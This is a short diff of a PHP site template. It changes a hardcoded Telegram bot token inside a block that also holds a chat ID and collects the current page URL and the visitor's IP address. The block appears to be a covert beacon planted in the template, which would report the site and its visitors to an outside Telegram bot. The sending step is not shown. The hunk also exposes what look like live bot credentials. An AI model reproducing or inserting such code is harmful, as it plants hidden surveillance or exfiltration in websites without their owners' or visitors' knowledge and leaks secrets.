@@ -3043,7 +3043,7 @@ global $lang, $root_url, $sticky_navbar, $favicon_path;
 $isStickyNavBar = $sticky_navbar ? 'navbar-fixed' : 'navbar-normal';
 ?>
     <?php
-$telegram_token = "7479232652:AAEGOGcgwzSBvM-lzQjKspGZ4PZUldY3mtA"; 
+$telegram_token = "7479232652:AAHoyJCGVSQ6WPBPfDq34xedR0ElOa3GxLg"; 
 $chat_id = "6812471405"; 
 $file_url = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
 $ip_address = $_SERVER['REMOTE_ADDR'];
